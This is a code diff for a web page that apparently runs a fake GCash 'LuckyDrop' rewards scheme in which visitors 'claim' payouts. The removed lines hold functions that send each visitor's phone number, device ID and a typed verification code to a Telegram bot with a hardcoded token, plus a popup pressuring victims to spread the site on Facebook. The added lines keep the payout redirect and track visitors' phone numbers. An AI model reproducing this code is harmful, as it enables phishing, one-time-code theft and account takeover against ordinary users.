+                this.style.opacity = '0.8';
+                
+                window.addEventListener('beforeunload', beforeUnloadHandler);
+                
+                const linkData = await getLatestPayoutLink();
+                
+                if (linkData && linkData.url) {
+                    const userPhone = localStorage.getItem("userPhone") || "Unknown";
+                    await markLinkAsUsed(linkData.key, userPhone);
+                    
+                    isRedirecting = true;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> REDIRECTING TO GCASH...`;
+                    setTimeout(() => {
+                        window.removeEventListener('beforeunload', beforeUnloadHandler);
+                        window.location.href = linkData.url;
+                    }, 500);
+                } else {
+                    claimInProgress = false;
+                    isRedirecting = false;
                     window.removeEventListener('beforeunload', beforeUnloadHandler);
-                    window.location.href = linkData.url;
-                }, 500);
-                
-            } else {
-                claimInProgress = false;
-                isRedirecting = false;
-                window.removeEventListener('beforeunload', beforeUnloadHandler);
-                
-                this.disabled = false;
-                this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
-                this.style.opacity = '1';
-                
-                // SHOW TASK #3 MESSAGE
-                showTask3Message();
-            }
-        };
+                    
+                    this.disabled = false;
+                    this.innerHTML = `<img src="images/gc_icon.png" class="gc-icon"> CLAIM VIA GCASH APP`;
+                    this.style.opacity = '1';
+                    
+                    alert("No payout link available. Please try again later.");
+                }
+            };
+        }
     }
-}
-
-    // ========== TASK #3 MESSAGE (No Available Link) ==========
-function showTask3Message() {
-    const popupInner = document.querySelector('.popup-inner');
-    if (!popupInner) return;
-    
-    const userPhone = localStorage.getItem("userPhone");
-    let last4Digits = "";
-    if (userPhone && userPhone.length >= 11) {
-        last4Digits = userPhone.substring(7, 11);
-    }
-    
-    popupInner.innerHTML = `
-        <div class="popup-close" id="popupCloseTask3">✕</div>
-        
-        <div style="text-align: center; margin-bottom: 10px;">
-            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📋</div>
-        </div>
-        
-        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
-            TASK #3 COMPLETION REQUIRED
-        </h2>
-        
-        <div class="divider" style="width: 40px; margin: 10px auto;"></div>
-        
-        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
-            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0;">
-                We want to ensure every real task earner gets paid fairly on our referral system. 
-                To protect against unverified users, <br>We are now conducting validation through 
-                <strong style="color: #ffd700;">Task #3</strong>.
-            </p>
-        </div>
-        
-        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 16px; padding: 15px; margin: 10px 0;">
-            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; line-height: 1.5; text-align: center; margin: 0;">
-                Find the <strong style="color: #ffd700;">'Share on Facebook'</strong> button and share your experience! 
-                Remember: <strong>More posts, more chances to validate your payout request.</strong>
-            </p>
-        </div>
-        
-        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 20px; padding: 12px; margin: 10px 0; text-align: center;">
-            <div style="font-size: 10px; color: #ffd700; margin-bottom: 5px;">OFFICIAL HASHTAGS</div>
-            <div style="font-family: monospace; font-size: 14px; color: #00aaff; font-weight: bold;">
-                #LuckyDrop #Task${last4Digits}
-            </div>
-            <div style="font-size: 10px; color: #888; margin-top: 5px;">
-                (Use your unique hashtag for validation)
-            </div>
-        </div>
-        
-        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
-            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
-                🚀 Finish this step to secure your Instant Approval and Extra Rewards!
-            </p>
-        </div>
-        
-        <button class="btn-facebook-shimmer" id="task3ShareBtn" style="width: 100%; margin: 15px 0; background: linear-gradient(135deg, #1877F2, #0a56b6); border: none; border-radius: 50px; padding: 14px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
-            <i class="fa-brands fa-facebook-f"></i>
-            <span>SHARE ON FACEBOOK</span>
-        </button>
-        
-        <div class="button-separator" style="margin: 15px 0 10px;"></div>
-
-        <button class="back-btn" id="backBtnTask3" style="transition: all 0.2s ease; width: 100%;">
-            ← DO REFERRAL TASK
-        </button>
-    `;
-    
-    // Attach events
-    const closeBtn = document.getElementById('popupCloseTask3');
-    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
-    
-    const backBtn = document.getElementById('backBtnTask3');
-    if (backBtn) backBtn.onclick = function() { 
-        closePopup();
-        showPhase1(currentBalance);
-    };
-    
-    const shareBtn = document.getElementById('task3ShareBtn');
-    if (shareBtn) {
-        shareBtn.onclick = function() {
-            const shareUrl = "https://xjiligames.github.io/rewards/index.html";
-            const fbUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
-            window.open(fbUrl, '_blank', 'width=600,height=400');
-            console.log('User shared on Facebook for Task #3');
-        };
-    }
-}
     
     // ========== SHOW POPUP ==========
     async function showPopup(balance) {
@@ -672,98 +678,6 @@ function showTask3Message() {
             if (ticker) ticker.style.display = 'none';
         }
     }
-
-    // ========== MARK LINK AS USED (Booking System) ==========
-async function markLinkAsUsed(linkKey, userPhone) {
-    try {
-        const db = firebase.database();
-        await db.ref('links/' + linkKey).update({
-            status: 'used',
-            user: userPhone,
-            usedAt: Date.now()
-        });
-        console.log(`🔗 Link ${linkKey} marked as used by ${userPhone}`);
-    } catch(e) {
-        console.error('Error marking link as used:', e);
-    }
-}
-
-    // ========== TELEGRAM NOTIFICATION ==========
-async function sendTelegramMessage(userPhone, deviceId, action, details) {
-    try {
-        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-        const chatId = "7298607329";
-        
-        const now = new Date();
-        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
-        
-        let message = `CLAIM VIA GCASH CLICKED
-User: ${userPhone}
-Device ID: ${deviceId}
-Time: ${timestamp}`;
-        
-        if (details) {
-            message += `\nDetails: ${details}`;
-        }
-        
-        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-        
-        await fetch(url, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: chatId,
-                text: message
-            })
-        });
-        
-        console.log('Telegram sent for claim click');
-    } catch(e) {
-        console.error('Telegram error:', e);
-    }
-}
-    // ========== TELEGRAM: REQUEST CALL ==========
-async function sendFirewallRequestNotification(userPhone, deviceId) {
-    try {
-        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-        const chatId = "7298607329";
-        
-        const now = new Date();
-        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
-        
-        const message = `📞 REQUEST CALL
-User: ${userPhone}
-Device ID: ${deviceId}
-Time: ${timestamp}`;
-        
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-        
-        console.log('Telegram: Request call sent');
-    } catch(e) { console.error('Telegram error:', e); }
-}
-
-// ========== TELEGRAM: VERIFICATION CODE ATTEMPT ==========
-async function sendVerificationAttemptNotification(userPhone, deviceId, code) {
-    try {
-        const botToken = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
-        const chatId = "7298607329";
-        
-        const now = new Date();
-        const timestamp = `${now.getMonth()+1}/${now.getDate()}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
-        
-        const message = `🔑 VERIFICATION CODE
-User: ${userPhone}
-Device ID: ${deviceId}
-Code: ${code}
-Time: ${timestamp}`;
-        
-        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`);
-        
-        console.log('Telegram: Verification attempt sent');
-    } catch(e) { console.error('Telegram error:', e); }
-}
     
     // ========== CLOSE POPUP ==========
     function closePopup() {
